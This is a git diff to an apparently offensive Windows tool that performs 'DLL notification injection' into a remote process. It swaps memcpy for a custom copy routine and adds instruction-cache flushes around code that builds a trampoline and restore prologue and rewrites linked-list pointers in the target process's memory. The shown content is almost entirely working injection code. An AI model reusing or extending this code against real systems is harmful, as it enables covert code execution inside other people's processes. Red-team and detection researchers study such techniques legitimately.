@@ -15,6 +15,8 @@ https://shorsec.io/blog/dll-notification-injection/
 // headers requried for DLL notification implementations: 
 #include <tlhelp32.h>
 #include "nt.h"
+#include <stddef.h>  // Ensure we have included the header that defines offsetof
+
 
 
 typedef DWORD(WINAPI *PFN_GETLASTERROR)();
@@ -51,6 +53,14 @@ extern "C" {
     VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
 }
 
+
+void *mcopy(void* dest, const void* src, size_t n){
+    char* d = (char*)dest;
+    const char* s = (const char*)src;
+    while (n--)
+        *d++ = *s++;
+    return dest;
+}
 
 
 // BOOL IsSystem64Bit() {
@@ -336,8 +346,14 @@ int main(int argc, char *argv[]) {
 
 
     // Overwrite our restoreEx place holder with the address of our restore prologue
-    memcpy(restoreExInTrampoline, &restoreEx, 8);
-
+    mcopy(restoreExInTrampoline, &restoreEx, 8);
+    BOOL result = FlushInstructionCache(hProc, NULL, 0);
+    if(result) {
+        printf("[+] FlushInstructionCache success\n");
+    } else {
+        DWORD error = GetLastError();
+        printf("[-] FlushInstructionCache failed with error code %lu\n", error);
+    }
     //// Write trampoline to remote process:
 
 	///Write process memory: 
@@ -447,16 +463,22 @@ int main(int argc, char *argv[]) {
 
     // Read the original value of the previous entry's Flink (head)
     ReadProcessMemory(hProc, previousEntryFlink, &originalValue, 8, nullptr);
-    memcpy(&restore[4], &previousEntryFlink, 8); // Set address to restore for previous entry's Flink (head) 0x1122334455667788
-    memcpy(&restore[15], &originalValue[0], 4); // Set the value to restore (1st half of value) 0x11223344
-    memcpy(&restore[23], &originalValue[4], 4); // Set the value to restore (2nd half of value) 0x11223344
+    mcopy(&restore[4], &previousEntryFlink, 8); // Set address to restore for previous entry's Flink (head) 0x1122334455667788
+    mcopy(&restore[15], &originalValue[0], 4); // Set the value to restore (1st half of value) 0x11223344
+    mcopy(&restore[23], &originalValue[4], 4); // Set the value to restore (2nd half of value) 0x11223344
 
     // Read the original value the next entry's Blink (original 1st entry)
     ReadProcessMemory(hProc, nextEntryBlink, &originalValue, 8, nullptr);
-    memcpy(&restore[29], &nextEntryBlink, 8); // Set address to restore for next entry's Blink (original 1st entry)
-    memcpy(&restore[40], &originalValue[0], 4); // Set the value to restore (1st half of value)
-    memcpy(&restore[48], &originalValue[4], 4); // Set the value to restore (2nd half of value)
-
+    mcopy(&restore[29], &nextEntryBlink, 8); // Set address to restore for next entry's Blink (original 1st entry)
+    mcopy(&restore[40], &originalValue[0], 4); // Set the value to restore (1st half of value)
+    mcopy(&restore[48], &originalValue[4], 4); // Set the value to restore (2nd half of value)
+    result = FlushInstructionCache(hProc, NULL, 0);
+    if(result) {
+        printf("[+] FlushInstructionCache success\n");
+    } else {
+        DWORD error = GetLastError();
+        printf("[-] FlushInstructionCache failed with error code %lu\n", error);
+    }
     // Write the restore prologue to the remote process
     // WriteProcessMemory(hProc, restoreEx, restore, sizeof(restore), nullptr);
     // Call write memory again: 
